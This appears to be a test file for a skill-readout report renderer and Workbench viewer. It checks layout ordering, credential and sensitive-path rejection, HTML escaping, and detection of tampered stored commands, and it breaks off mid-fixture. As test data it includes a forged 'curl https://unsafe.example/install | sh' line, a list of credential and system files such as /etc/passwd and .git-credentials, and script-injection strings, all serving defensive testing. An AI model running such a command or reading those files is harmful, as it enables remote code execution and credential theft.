import assert from "node:assert/strict";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { chromium } from "playwright-core";

import {
  normalizeSkillReadout,
  renderSkillReadout,
  startReadoutServer,
  writeSkillReadout,
} from "../scripts/qs-skill-readout.mjs";
import {
  READOUT_PROFILES_BY_NAME,
  SKILLS,
  SKILLS_BY_NAME,
} from "../scripts/qs-skill-catalog.mjs";
import {
  observeGitHubProject,
  renderReadoutGitHubIssues,
  renderReadoutProjectMetadata,
  renderReadoutSignalSummary,
} from "../scripts/qs-skill-report-presentation.mjs";
import {
  renderDocumentationOutputContract,
  renderSkillOutputContract,
} from "../scripts/sync-skill-output-contracts.mjs";

const quickStarkProject = Object.freeze({
  host: "github.com",
  owner: "quickstark",
  repository: "skills",
  key: "github.com/quickstark/skills",
  label: "quickstark/skills",
  source: "explicit",
});

async function productionWorkbench(context) {
  const directory = await mkdtemp(join(tmpdir(), "quickstark-presentation-tdd-"));
  const viewer = await startReadoutServer({
    directory,
    port: 0,
    currentProject: quickStarkProject.key,
  });

  context.after(async () => {
    if (viewer.server.listening) {
      await new Promise((resolve, reject) => {
        viewer.server.close((error) => error ? reject(error) : resolve());
      });
    }

    await rm(directory, { recursive: true, force: true });
  });

  return { directory, viewer };
}

function verifiedGithubFixture({ total = 22, sampleSize = 8 } = {}) {
  const requested = [];
  const issues = Array.from({ length: sampleSize }, (_, index) => ({
    number: index + 1,
    title: `Verified open report issue ${index + 1}`,
    state: "open",
    html_url: `https://github.com/quickstark/skills/issues/${index + 1}`,
    labels: [{ name: "reporting" }],
  }));
  const fetcher = async (url) => {
    requested.push(url);

    const payload = url.includes("/search/issues?")
      ? { total_count: total, incomplete_results: false, items: issues.slice(0, 1) }
      : url.endsWith("/issues?state=open&per_page=8")
        ? issues
        : {
          full_name: "quickstark/skills",
          html_url: "https://github.com/quickstark/skills",
          default_branch: "main",
          visibility: "public",
        };

    return new Response(JSON.stringify(payload), {
      headers: { "Content-Type": "application/json" },
    });
  };

  return { fetcher, issues, requested, total };
}

test("module Visual Summary preserves complete boundary titles and categories across browser widths", async (context) => {
  const decisions = [
    { title: "Use a deep browser-visual delivery module with authenticated project-scoped URLs" },
    { title: "Guide setup by harness before operating-system-specific producer installation" },
    { title: "Expose privileged Settings through an independently isolated authentication boundary" },
  ];
  const findings = [
    { title: "The visual website opened in VS Code instead of the authenticated web browser" },
    { title: "Codex and ChatGPT share one authenticated, independently revocable reporting interface" },
  ];
  const browser = await chromium.launch({ headless: true });

  context.after(async () => browser.close());

  const page = await browser.newPage({ viewport: { width: 1440, height: 980 } });

  await page.setContent(renderSkillReadout({
    skill: "qs-design-modules",
    outcome: "Record complete module boundaries and interfaces without hiding their meaning.",
    decisions,
    findings,
  }), { waitUntil: "load" });

  const summary = page.locator("figure.signal-panel");
  const nodes = summary.locator("svg g");

  assert.equal(await nodes.count(), 5, "all five actual observations remain visible in the module blueprint");

  for (const [index, item] of [...decisions, ...findings].entries()) {
    const node = nodes.nth(index);
    const title = node.locator("text").first();
    const category = node.locator("text").last();

    assert.equal(
      (await title.textContent()).replace(/\s+/g, " ").trim(),
      item.title,
      "the visual shows the complete recorded title rather than an ellipsis",
    );
    assert.equal(
      (await category.textContent()).trim(),
      index < decisions.length ? "Module boundaries" : "Interface observations",
      "the observed category remains complete rather than colliding with its title",
    );
  }

  for (const width of [1440, 760, 390]) {
    await page.setViewportSize({ width, height: 980 });

    const layout = await nodes.evaluateAll((elements) => elements.map((node) => {
      const card = node.querySelector("rect").getBBox();

      return Array.from(node.querySelectorAll("text"), (text) => {
        const bounds = text.getBBox();

        return {
          insideLeft: bounds.x >= card.x - 1,
          insideRight: bounds.x + bounds.width <= card.x + card.width + 1,
          insideTop: bounds.y >= card.y - 1,
          insideBottom: bounds.y + bounds.height <= card.y + card.height + 1,
        };
      });
    }));

    for (const node of layout) {
      for (const text of node) {
        assert.deepEqual(text, {
          insideLeft: true,
          insideRight: true,
          insideTop: true,
          insideBottom: true,
        }, `complete module text stays inside its visual card at ${width}px`);
      }
    }

    assert.equal(
      await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
      true,
      `the complete visual remains responsive at ${width}px`,
    );
  }
});

test("actual skill readouts expose only recorded user-run commands and key code as copyable blocks", () => {
  const command = {
    title: "Install the updated QuickStark plugin",
    command: "codex plugin add qs-skills@quickstark --json",
    detail: "Run this in your terminal to install the independently verified plugin update.",
  };
  const keyCode = {
    title: "Published Codex plugin version",
    path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
    language: "json",
    code: '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}',
    detail: "The installed plugin must use the same version as the verified release.",
  };
  const input = {
    skill: "qs-code-build",
    outcome: "Recorded the actual user installation command and versioned plugin manifest.",
    commands: [command],
    keyCode: [keyCode],
  };
  const report = normalizeSkillReadout(input);
  const html = renderSkillReadout(input);

  assert.equal(report.commands.length, 1);
  assert.equal(report.commands[0].title, command.title);
  assert.equal(report.commands[0].command, command.command);
  assert.equal(report.commands[0].detail, command.detail);
  assert.equal(report.commands[0].language, "bash");
  assert.equal(report.keyCode.length, 1);
  assert.equal(report.keyCode[0].title, keyCode.title);
  assert.equal(report.keyCode[0].path, keyCode.path);
  assert.equal(report.keyCode[0].language, "json");
  assert.equal(report.keyCode[0].code, keyCode.code);
  assert.match(html, /<h2>Commands to run<\/h2>/);
  assert.match(html, /Run this in your terminal to install the independently verified plugin update\./);
  assert.match(
    html,
    /<pre class="presentation-evidence-block"><code class="language-bash">codex plugin add qs-skills@quickstark --json<\/code><\/pre>/,
  );
  assert.match(html, /<h2>Key code<\/h2>/);
  assert.match(html, /codex\/plugins\/qs-skills\/\.codex-plugin\/plugin\.json/);
  assert.match(html, /<pre class="presentation-evidence-block"><code class="language-json">/);
  assert.match(html, /&quot;version&quot;: &quot;2\.6\.0&quot;/);
  assert.ok(
    html.indexOf("<h2>Top next prompts</h2>") < html.indexOf("<h2>Commands to run</h2>"),
    "native next prompts stay at the top before optional user-run commands",
  );
});

test("top next prompts follow the visual summary before user actions and execution evidence", () => {
  const html = renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Keep the next action above recorded commands, source, and changed files.",
    execution: {
      files: [{
        path: "scripts/qs-skill-readout.mjs",
        change: "modified",
        summary: "Restore the approved prompt-first report layout.",
      }],
    },
    provenance: {
      commit: {
        sha: "30b2e330c4a5cec64ad1052264b37d43b1736137",
        published: false,
      },
    },
    commands: [{
      title: "Verify the report presentation",
      command: "node --test tests/qs-report-presentation.test.mjs",
      detail: "Run this in your terminal when you want to verify report presentation independently.",
    }],
    keyCode: [{
      title: "Prompt-first report ordering",
      path: "scripts/qs-skill-readout.mjs",
      language: "javascript",
      code: "${summary}\n${next}\n${actionableCode}\n${execution}",
    }],
  });
  const summary = html.indexOf('<div class="presentation-summary-panel">');
  const next = html.indexOf("<h2>Top next prompts</h2>");
  const commands = html.indexOf("<h2>Commands to run</h2>");
  const keyCode = html.indexOf("<h2>Key code</h2>");
  const execution = html.indexOf("<h2>Execution context</h2>");
  const delivery = html.indexOf("<h2>Verified delivery evidence</h2>");

  for (const [label, position] of Object.entries({
    summary,
    next,
    commands,
    keyCode,
    execution,
    delivery,
  })) {
    assert.notEqual(position, -1, `${label} must be visible in the actual report`);
  }

  assert.ok(summary < next, "the five-second visual summary remains first");
  assert.ok(next < commands, "recommended next prompts precede user-run commands");
  assert.ok(commands < keyCode, "terminal instructions precede recorded key code");
  assert.ok(keyCode < execution, "optional user actions precede the longer execution context");
  assert.ok(execution < delivery, "verified delivery remains visible after execution context");
});

test("user-run terminal commands require an explanation and are never inferred from execution logs", () => {
  assert.throws(() => normalizeSkillReadout({
    skill: "qs-code-debug",
    outcome: "Recorded a debugging command without explaining when the user should run it.",
    commands: [{
      title: "Debug the application",
      command: "npm run debug",
    }],
  }), /commands\[0\]\.detail.*(?:why|when|explain)/i);

  for (const skill of SKILLS) {
    const completed = renderSkillReadout({
      skill: skill.name,
      outcome: `Recorded ${skill.displayName} without requiring a terminal action.`,
      outputs: [{
        title: "Skill executed its own verification",
        detail: "npm test was executed by the skill; the user does not need to rerun it.",
      }],
      checks: [{
        title: "npm test",
        detail: "The skill already executed this check.",
        status: "passed",
      }],
    });
    const preview = renderSkillReadout({
      skill: skill.name,
      status: "Preview",
      skillsUsed: [],
      outcome: `Preview ${skill.displayName}; no actual command or code was recorded.`,
    });

    for (const [state, html] of [["completed", completed], ["preview", preview]]) {
      assert.doesNotMatch(html, /<h2>Commands to run<\/h2>/, `${skill.name} ${state} cannot invent a terminal action`);
      assert.doesNotMatch(html, /<h2>Key code<\/h2>/, `${skill.name} ${state} cannot invent a source excerpt`);
      assert.doesNotMatch(html, /<meta name="quickstark:(?:user-command|key-code)"/, `${skill.name} ${state} cannot invent action metadata`);
    }
  }

  assert.throws(() => normalizeSkillReadout({
    skill: "qs-code-build",
    status: "Preview",
    skillsUsed: [],
    outcome: "An unrun skill cannot claim an actual installation instruction.",
    commands: [{
      title: "Invented installation",
      command: "npm install",
      detail: "This action was not generated by any actual skill run.",
    }],
  }), /preview cannot claim.*commands/i);

  assert.throws(() => normalizeSkillReadout({
    skill: "qs-code-build",
    status: "Preview",
    skillsUsed: [],
    outcome: "An unrun skill cannot claim actual project code.",
    keyCode: [{
      title: "Invented implementation",
      code: "export const invented = true;",
    }],
  }), /preview cannot claim.*code/i);
});

test("all promoted skill contracts distinguish user-run commands and key code from execution logs", () => {
  for (const skill of SKILLS) {
    for (const [name, contract] of [
      ["skill instructions", renderSkillOutputContract(skill)],
      ["skill documentation", renderDocumentationOutputContract(skill)],
    ]) {
      assert.match(contract, /`commands`/, `${skill.name} ${name} documents optional user-run commands`);
      assert.match(contract, /`keyCode`/, `${skill.name} ${name} documents optional recorded key code`);
      assert.match(contract, /(?:why|when).{0,90}(?:run|terminal)|(?:run|terminal).{0,90}(?:why|when)/i, `${skill.name} ${name} explains when the user should run a command`);
      assert.match(contract, /(?:already executed|execution logs|execution transcript)/i, `${skill.name} ${name} distinguishes user actions from the skill's completed work`);
      assert.match(contract, /(?:credentials|secrets|private keys)/i, `${skill.name} ${name} protects sensitive content`);
      assert.match(contract, /QS_READOUT_PRODUCER_TOKEN/, `${skill.name} ${name} keeps the producer credential privately configured`);
      assert.match(contract, /reports\.quickstark\.com\/api\/v1\/readouts/, `${skill.name} ${name} identifies the default authenticated reports API`);
      assert.match(contract, /(?:actual|current).{0,60}working directory/i, `${skill.name} ${name} derives reporting from the actual project`);
      assert.match(contract, /(?:Git origin.{0,60}available|available.{0,60}Git origin|workspace.{0,90}(?:remote|origin)|(?:remote|origin).{0,90}workspace)/i, `${skill.name} ${name} supports ordinary workspaces with or without a Git remote`);
      assert.match(contract, /(?:only|single).{0,60}(?:required|setting|credential|token)/i, `${skill.name} ${name} requires only a privately configured reporting token`);
      assert.doesNotMatch(contract, /(?:configure|requires?|required).{0,140}QS_READOUT_(?:INGESTION_URL|PRODUCER_ID|PUBLISH_PROJECTS|HARNESS)/i, `${skill.name} ${name} must not require additional machine or project settings`);
      assert.match(contract, /(?:macOS|Mac).{0,80}(?:Windows|Linux)|Linux.{0,80}(?:macOS|Mac).{0,80}Windows/i, `${skill.name} ${name} describes cross-machine reporting`);
    }
  }
});

test("recorded command and code blocks reject credentials, unsafe paths, malformed items, and excessive content", () => {
  const base = {
    skill: "qs-code-debug",
    outcome: "Validate explicitly recorded user actions before displaying them.",
  };
  const command = {
    title: "Debug the verified regression",
    command: "npm run debug",
    detail: "Run this in your terminal to reproduce the confirmed regression.",
  };
  const code = {
    title: "Verified source excerpt",
    code: "export const verified = true;",
    language: "typescript",
    path: "src/verified.ts",
  };

  for (const [overrides, expected] of [
    [{ commands: "npm run debug" }, /commands must be an array/i],
    [{ commands: [null] }, /commands\[0\].*recorded command/i],
    [{ commands: [{ ...command, command: "" }] }, /commands\[0\]\.command.*non-empty/i],
    [{ commands: [{ ...command, detail: "" }] }, /commands\[0\]\.detail.*non-empty/i],
    [{ commands: [{ ...command, language: "bash\" onclick=\"alert(1)" }] }, /safe code-block language/i],
    [{ commands: [{ ...command, command: "export ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, title: "ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, detail: "Run with ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, detail: "Run with ghp_syntheticCredentialValue123456789abcdef" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, command: "curl -H 'Authorization: Bearer syntheticCredentialValue123456789' https://example.invalid" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, detail: "Run with Authorization: Bearer syntheticCredentialValue123456789" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, command: "curl https://reader:syntheticCredentialValue123456789@example.invalid" }] }, /credential|token|private key/i],
    [{ commands: [{ ...command, title: "Unsafe\u0000command title" }] }, /unsafe control/i],
    [{ commands: [{ ...command, detail: "Run this\u0000unsafe explanation" }] }, /unsafe control/i],
    [{ commands: [{ ...command, command: "npm run debug\u0000 --unsafe" }] }, /unsafe control/i],
    [{ commands: [{ ...command, command: "x".repeat(12_001) }] }, /safe recorded command size/i],
    [{ commands: Array.from({ length: 13 }, (_, index) => ({ ...command, title: `Action ${index + 1}` })) }, /at most 12/i],
    [{ commands: [{ ...command, fabricated: true }] }, /not a supported recorded command field/i],
    [{ keyCode: [null] }, /keyCode\[0\].*recorded code/i],
    [{ keyCode: [{ ...code, path: "../private.ts" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "/etc/passwd" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".env.production" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".git/config" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".docker/config.json" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".npmrc" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".git-credentials" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: ".netrc" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "credentials.json" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "secrets.yaml" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "tokens.json" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "config/service-account.json" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "config/application_default_credentials.json" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "config/id_ed25519" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "certificates/private.pem" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, path: "certificates/private.key" }] }, /safe, non-sensitive relative project file/i],
    [{ keyCode: [{ ...code, title: "ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
    [{ keyCode: [{ ...code, detail: "Recorded ACCESS_TOKEN=actuallysecretvalue123456789" }] }, /credential|token|private key/i],
    [{ keyCode: [{ ...code, title: "Unsafe\u0000source title" }] }, /unsafe control/i],
    [{ keyCode: [{ ...code, detail: "Recorded\u0000unsafe explanation" }] }, /unsafe control/i],
    [{ keyCode: [{ ...code, code: "-----BEGIN PRIVATE KEY-----\nreal private data" }] }, /credential|token|private key/i],
    [{ keyCode: [{ ...code, language: "html onclick=alert(1)" }] }, /safe code-block language/i],
    [{ keyCode: [{ ...code, hidden: "invented metadata" }] }, /not a supported recorded code field/i],
  ]) {
    assert.throws(() => normalizeSkillReadout({ ...base, ...overrides }), expected);
  }
});

test("user-run commands and key code escape hostile markup without activating page content", () => {
  const command = "printf '</code></pre><script>window.commandExecuted=true</script>'";
  const code = "</code></pre><script>window.sourceExecuted=true</script>";
  const html = renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Safely display observed terminal and source text.",
    commands: [{
      title: "Inspect </h3><script>window.titleExecuted=true</script>",
      command,
      detail: "Run this only when intentionally inspecting the recorded literal text.",
    }],
    keyCode: [{
      title: "Recorded HTML boundary",
      language: "html",
      code,
    }],
  });

  assert.match(html, /&lt;\/code&gt;&lt;\/pre&gt;&lt;script&gt;window\.commandExecuted=true&lt;\/script&gt;/);
  assert.match(html, /&lt;\/code&gt;&lt;\/pre&gt;&lt;script&gt;window\.sourceExecuted=true&lt;\/script&gt;/);
  assert.match(html, /Inspect &lt;\/h3&gt;&lt;script&gt;window\.titleExecuted=true&lt;\/script&gt;/);
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /onclick\s*=/i);
});

test("the Project Workbench preserves recorded user commands and key code without rewriting an immutable report", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const command = "codex plugin add qs-skills@quickstark --json";
  const snippet = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Preserve an actionable installation command and the actual published plugin version.",
    generatedAt: "2026-07-27T18:10:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
    commands: [{
      title: "Install the updated plugin",
      command,
      detail: "Run this in your terminal when you want to load the published skill update.",
    }],
    keyCode: [{
      title: "Published plugin manifest",
      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
      language: "json",
      code: snippet,
      detail: "Confirm the plugin version before installing it.",
    }],
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();
  const selected = html.match(
    /<aside\b[^>]*aria-label="Selected skill readout"[^>]*>([\s\S]*?)<\/aside>/,
  );

  assert.equal(response.status, 200);
  assert.match(original, /<meta name="quickstark:user-command" content=/);
  assert.match(original, /<meta name="quickstark:key-code" content=/);
  assert.ok(selected, "the complete immutable report remains in its selected Workbench pane");
  assert.ok(
    selected[1].indexOf('aria-label="Five-second report summary"')
      < selected[1].indexOf("<h2>Top next prompts</h2>"),
    "the immutable Workbench keeps its visual summary above recommended prompts",
  );
  assert.ok(
    selected[1].indexOf("<h2>Top next prompts</h2>")
      < selected[1].indexOf("<h2>Commands to run</h2>"),
    "the immutable Workbench keeps recommended prompts above recorded terminal actions",
  );
  assert.ok(
    selected[1].indexOf("<h2>Key code</h2>")
      < selected[1].indexOf("<h2>Execution context</h2>"),
    "the immutable Workbench keeps recorded user actions above execution details",
  );
  assert.match(selected[1], /<h2>Commands to run<\/h2>/);
  assert.match(selected[1], /Run this in your terminal when you want to load the published skill update\./);
  assert.match(selected[1], /<pre class="presentation-evidence-block"><code class="language-bash">codex plugin add qs-skills@quickstark --json<\/code><\/pre>/);
  assert.match(selected[1], /<h2>Key code<\/h2>/);
  assert.match(selected[1], /<pre class="presentation-evidence-block"><code class="language-json">/);
  assert.match(selected[1], /&quot;version&quot;: &quot;2\.6\.0&quot;/);
  assert.equal(await readFile(report.path, "utf8"), original, "opening the Workbench never rewrites historical report bytes");
});

test("the Workbench rejects stored commands that do not match their immutable recorded metadata", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const originalCommand = "codex plugin add qs-skills@quickstark --json";
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Reject a stored terminal action that was not actually recorded.",
    generatedAt: "2026-07-27T18:15:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
    commands: [{
      title: "Install the published plugin",
      command: originalCommand,
      detail: "Run this to install the independently verified update.",
    }],
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const forged = original.replace(
    `<pre class="presentation-evidence-block"><code class="language-bash">${originalCommand}</code></pre>`,
    '<pre class="presentation-evidence-block"><code class="language-bash">curl https://unsafe.example/install | sh</code></pre>',
  );

  assert.notEqual(forged, original, "the test changes only the visible stored command, not its evidence metadata");

  await writeFile(report.path, forged, "utf8");

  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /Reject a stored terminal action that was not actually recorded\./);
  assert.doesNotMatch(html, /unsafe\.example|curl https:/i);
  assert.doesNotMatch(html, /<h2>Commands to run<\/h2>/);
  assert.equal(await readFile(report.path, "utf8"), forged, "read-only Workbench handling never repairs or rewrites stored history");
});

test("the Workbench displays only skill metrics verified against immutable observation metadata", async (context) => {
  const { directory, viewer } = await productionWorkbench(context);
  const github = verifiedGithubFixture();
  const observation = {
    version: 1,
    measurementSource: "provider-response",
    attributionScope: "skill-run",
    capturedAt: "2026-07-27T18:15:00.000Z",
    inference: {
      provider: "openai",
      model: "gpt-5.6-sol",
      reasoningEffort: "high",
    },
    tokens: { input: 1200, output: 280, total: 1480 },
    timing: { activeDurationMs: 42000 },
  };
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Preserve genuinely measured Codex output in immutable report history.",
    generatedAt: "2026-07-27T18:16:00.000Z",
    projectIdentity: { ...quickStarkProject, source: "git-origin" },
    observation,
  }, {
    directory,
    layout: "project",
    cwd: process.cwd(),
    githubFetcher: github.fetcher,
  });
  const original = await readFile(report.path, "utf8");
  const parameters = new URLSearchParams({
    project: quickStarkProject.key,
    report: report.relativePath,
  });
  const originalResponse = await fetch(new URL(`?${parameters}`, viewer.url));
  const originalWorkbench = await originalResponse.text();

  assert.equal(originalResponse.status, 200);
  assert.match(originalWorkbench, /<h2>Skill run metrics<\/h2>/);
  assert.match(originalWorkbench, /gpt-5\.6-sol/);
  assert.match(originalWorkbench, /1,480/);
  assert.match(originalWorkbench, /42,000 ms/);
  assert.equal(await readFile(report.path, "utf8"), original);

  const forged = original.replace(
    '<article class="presentation-run-metric"><span>MODEL</span><strong>gpt-5.6-sol</strong></article>',
    '<article class="presentation-run-metric"><span>MODEL</span><strong>fabricated-provider-model</strong></article>',
  );

  assert.notEqual(forged, original, "the test changes visible metrics without changing immutable observation metadata");

  await writeFile(report.path, forged, "utf8");

  const forgedResponse = await fetch(new URL(`?${parameters}`, viewer.url));
  const forgedWorkbench = await forgedResponse.text();

  assert.equal(forgedResponse.status, 200);
  assert.doesNotMatch(forgedWorkbench, /fabricated-provider-model/);
  assert.doesNotMatch(forgedWorkbench, /<h2>Skill run metrics<\/h2>/);
  assert.equal(await readFile(report.path, "utf8"), forged, "the Workbench never rewrites an immutable historical report");
});

test("actual Chromium renders verified Codex metrics as responsive top-of-report cards", async (context) => {
  const browser = await chromium.launch({ headless: true });

  context.after(async () => browser.close());

  const page = await browser.newPage({ viewport: { width: 1200, height: 1000 } });

  await page.setContent(renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Show the independently observed Codex metrics without moving recommended next actions.",
    observation: {
      version: 1,
      measurementSource: "provider-response",
      attributionScope: "skill-run",
      capturedAt: "2026-07-27T18:15:00.000Z",
      inference: {
        provider: "openai",
        model: "gpt-5.6-sol",
        reasoningEffort: "high",
      },
      tokens: { input: 1200, output: 280, total: 1480 },
      timing: { activeDurationMs: 42000 },
    },
  }), { waitUntil: "load" });

  const section = page.getByRole("heading", { name: "Skill run metrics" })
    .locator("xpath=ancestor::section");
  const cards = section.locator("article.presentation-run-metric");
  const next = await page.getByRole("heading", { name: "Top next prompts" }).boundingBox();
  const metrics = await page.getByRole("heading", { name: "Skill run metrics" }).boundingBox();
  const execution = await page.getByRole("heading", { name: "Execution context" }).boundingBox();

  assert.ok(next && metrics && execution);
  assert.ok(next.y < metrics.y && metrics.y < execution.y, "actual run metrics stay between top next prompts and execution details");
  assert.equal(await cards.count(), 6);
  assert.deepEqual(await cards.locator("strong").allTextContents(), [
    "gpt-5.6-sol", "high", "1,200", "280", "1,480", "42,000 ms",
  ]);
  assert.equal(
    await cards.first().locator("strong").evaluate((element) => getComputedStyle(element).fontSize),
    "13px",
    "recorded Codex metric values use the approved readable 13 px feature typography",
  );

  const positions = async () => cards.evaluateAll((elements) => elements.map((element) => {
    const bounds = element.getBoundingClientRect();

    return { top: bounds.top, bottom: bounds.bottom };
  }));
  const desktop = await positions();

  assert.ok(desktop.every((card) => Math.abs(card.top - desktop[0].top) <= 1), "all six metrics share one aligned desktop row");

  await page.setViewportSize({ width: 1040, height: 1000 });

  const tablet = await positions();

  assert.ok(tablet.slice(0, 3).every((card) => Math.abs(card.top - tablet[0].top) <= 1));
  assert.ok(tablet[3].top > tablet[0].bottom, "metrics wrap into two clean tablet rows");

  await page.setViewportSize({ width: 420, height: 900 });

  const mobile = await positions();

  assert.ok(Math.abs(mobile[0].top - mobile[1].top) <= 1);
  assert.ok(mobile[2].top > mobile[0].bottom, "metrics render in a readable two-column mobile layout");
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true);
});

test("actual Chromium renders responsive 12 px user-run commands and complete key code blocks", async (context) => {
  const commands = [{
    title: "Install the released QuickStark skills",
    command: "codex plugin add qs-skills@quickstark --json",
    detail: "Run this in your terminal to install the published plugin.",
  }, {
    title: "Debug the production report",
    command: "node --test --test-name-pattern='recorded user-run commands and key code' tests/qs-report-presentation.test.mjs",
    detail: "Run this only when you need to reproduce the specific report presentation behavior.",
  }];
  const snippet = '{\n  "name": "qs-skills",\n  "version": "2.6.0"\n}';
  const browser = await chromium.launch({ headless: true });

  context.after(async () => browser.close());

  const page = await browser.newPage({
    viewport: { width: 1200, height: 1000 },
  });

  await page.setContent(renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Provide actual install and debugging instructions with the published manifest.",
    commands,
    keyCode: [{
      title: "Published plugin version",
      path: "codex/plugins/qs-skills/.codex-plugin/plugin.json",
      language: "json",
      code: snippet,
    }],
  }), { waitUntil: "load" });

  const commandSection = page.getByRole("heading", { name: "Commands to run" })
    .locator("xpath=ancestor::section");
  const codeSection = page.getByRole("heading", { name: "Key code" })
    .locator("xpath=ancestor::section");
  const commandCards = commandSection.locator("article.presentation-evidence-card");
  const summaryBounds = await page.locator(".presentation-summary-panel").boundingBox();
  const nextBounds = await page.getByRole("heading", { name: "Top next prompts" }).boundingBox();
  const commandBounds = await page.getByRole("heading", { name: "Commands to run" }).boundingBox();
  const executionBounds = await page.getByRole("heading", { name: "Execution context" }).boundingBox();

  assert.ok(summaryBounds && nextBounds && commandBounds && executionBounds);
  assert.ok(
    nextBounds.y >= summaryBounds.y + summaryBounds.height - 1,
    "the browser renders the recommended prompts immediately below the visual summary",
  );
  assert.ok(nextBounds.y < commandBounds.y, "recommended prompts remain above user-run commands");
  assert.ok(commandBounds.y < executionBounds.y, "recorded user actions remain above execution details");
  assert.equal(await commandCards.count(), 2);

  for (const [index, item] of commands.entries()) {
    const block = commandCards.nth(index).locator("pre code");

    assert.equal(await block.textContent(), item.command, "the complete terminal command is copyable");
    assert.equal(await block.evaluate((element) => getComputedStyle(element).fontSize), "12px");
    assert.equal(await commandCards.nth(index).getByText(item.detail, { exact: true }).count(), 1);
  }

  const code = codeSection.locator("pre code");

  assert.equal(await code.textContent(), snippet, "the complete recorded code remains copyable");
  assert.equal(await code.evaluate((element) => getComputedStyle(element).fontSize), "12px");

  const desktop = await commandCards.evaluateAll((elements) => elements.map((element) => {
    const bounds = element.getBoundingClientRect();

    return { top: bounds.top, bottom: bounds.bottom };
  }));

  assert.ok(Math.abs(desktop[0].top - desktop[1].top) <= 1, "terminal actions share an aligned desktop row");
  assert.ok(Math.abs(desktop[0].bottom - desktop[1].bottom) <= 1, "unequal explanations keep equal desktop card heights");

  await page.setViewportSize({ width: 420, height: 900 });

  const mobile = await commandCards.evaluateAll((elements) => elements.map((element) => {
    const bounds = element.getBoundingClientRect();

    return { top: bounds.top, bottom: bounds.bottom };
  }));

  assert.ok(mobile[1].top > mobile[0].bottom, "user commands stack on narrow screens");
  assert.equal(
    await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
    true,
    "a long, copyable command scrolls inside its block without overflowing the report",
  );
});

test("the five-second report summary features a recorded P0 before an earlier P1 finding", () => {
  const html = renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Diagnosed multiple independently recorded production regressions.",
    findings: [
      {
        title: "An earlier high-priority layout regression",
        detail: "A recorded P1 finding must not conceal a later P0 finding.",
        priority: "P1",
      },
      {
        title: "The production report exposes a critical authorization failure",
        detail: "The observed P0 is the most important exception to surface first.",
        priority: "P0",
      },
    ],
  });
  const featured = html.match(
    /<article class="presentation-featured-signal">([\s\S]*?)<\/article>/,
  );

  assert.ok(featured, "the selected B report includes its featured exception");
  assert.match(featured[1], />P0</);
  assert.match(featured[1], /critical authorization failure/);
  assert.doesNotMatch(featured[1], /earlier high-priority layout regression/);
});

test("verified GitHub context never reports closed, cross-project, or pull-request records as open issues", async () => {
  const project = {
    host: "github.com",
    owner: "quickstark",
    repository: "skills",
  };
  const fetcher = async (url) => new Response(JSON.stringify(
    url.endsWith("/issues?state=open&per_page=8")
      ? [
        {
          number: 21,
          title: "Verify the open reporting regression",
          state: "open",
          html_url: "https://github.com/quickstark/skills/issues/21",
          labels: [{ name: "ready-for-agent" }],
        },
        {
          number: 44,
          title: "A closed issue must not reappear",
          state: "closed",
